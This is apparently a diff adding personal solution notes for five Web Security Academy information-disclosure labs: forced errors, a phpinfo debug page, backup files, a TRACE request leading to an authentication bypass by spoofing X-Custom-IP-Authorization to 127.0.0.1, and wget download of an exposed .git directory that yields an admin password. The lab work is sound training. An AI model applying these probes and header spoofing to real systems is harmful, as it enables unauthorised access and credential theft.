@@ -1,0 +1,131 @@
+/robots.txt
+/sitemap.xml
+phpinfo.php
+/.git
+
+1) Lab: Information disclosure in error messages
+
+https://0a68004e0383454c80a8adf500fb004f.web-security-academy.net/product?productId=10000000000000
+
+->
+
+Apache Struts 2 2.3.31
+
+2) Lab: Information disclosure on debug page
+
+/cgi-bin/phpinfo.php
+
+->
+
+https://0a35000003c9636c81468e6700ea0048.web-security-academy.net/cgi-bin/phpinfo.php
+
+->
+
+SECRET_KEY - rs2miu7qm3yhitqz9jgcudsluinq3rpn
+
+3) Lab: Source code disclosure via backup files
+
+https://0a50000b040ea20a807e447e00b50044.web-security-academy.net/robots.txt
+
+->
+
+https://0a50000b040ea20a807e447e00b50044.web-security-academy.net/backup
+
+->
+
+ProductTemplate.java.bak
+
+->
+
+ro190nmwsh2xfabgyrrm28cg9m5oyyel
+
+4) Lab: Authentication bypass via information disclosure
+
+TRACE /admin
+
+---
+
+TRACE /admin HTTP/2
+Host: 0a6a00d7036c6e1180068b5a00680052.web-security-academy.net
+Cookie: session=tQtI02nFlKLiuiZAUu1IJWS4srdaBEVX
+Sec-Ch-Ua: "Not A(Brand";v="99", "Chromium";v="154"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+
+->
+
+HTTP/2 200 OK
+Content-Type: message/http
+X-Frame-Options: SAMEORIGIN
+Content-Length: 787
+
+TRACE /admin HTTP/1.1
+Host: 0a6a00d7036c6e1180068b5a00680052.web-security-academy.net
+sec-ch-ua: "Not A(Brand";v="99", "Chromium";v="154"
+sec-ch-ua-mobile: ?0
+sec-ch-ua-platform: "Windows"
+accept-language: ru-RU,ru;q=0.9
+upgrade-insecure-requests: 1
+user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36
+accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+sec-fetch-site: none
+sec-fetch-mode: navigate
+sec-fetch-user: ?1
+sec-fetch-dest: document
+accept-encoding: gzip, deflate, br
+priority: u=0, i
+cookie: session=tQtI02nFlKLiuiZAUu1IJWS4srdaBEVX
+Content-Length: 0
+X-Custom-IP-Authorization: 46.17.105.49
+
+---
+
+X-Custom-IP-Authorization: 46.17.105.49
+
+---
+
+Add to request in intercept
+
+->
+
+X-Custom-Ip-Authorization: 127.0.0.1
+
+5) Lab: Information disclosure in version control history
+
+/.git
+
+---
+
+https://0aba002103b93e2a81c5ac4a00ef006e.web-security-academy.net/.git
+
+---
+
+wget -r -np -k https://0aba002103b93e2a81c5ac4a00ef006e.web-security-academy.net/.git/
+
+---
+
+git log
+
+---
+
+git diff eb6b8ac272e2ed7c7943e5275b8a0f1e309d92d5 9fbfcecee3b6260e09f24b2f039ea934fcf47816
+
+->
+
+diff --git a/admin.conf b/admin.conf
+index 21d23f1..6de8f8e 100644
+--- a/admin.conf
++++ b/admin.conf
+@@ -1 +1 @@
+-ADMIN_PASSWORD=env('ADMIN_PASSWORD')
++ADMIN_PASSWORD=fi5i76nzsrl0wj9a16mg
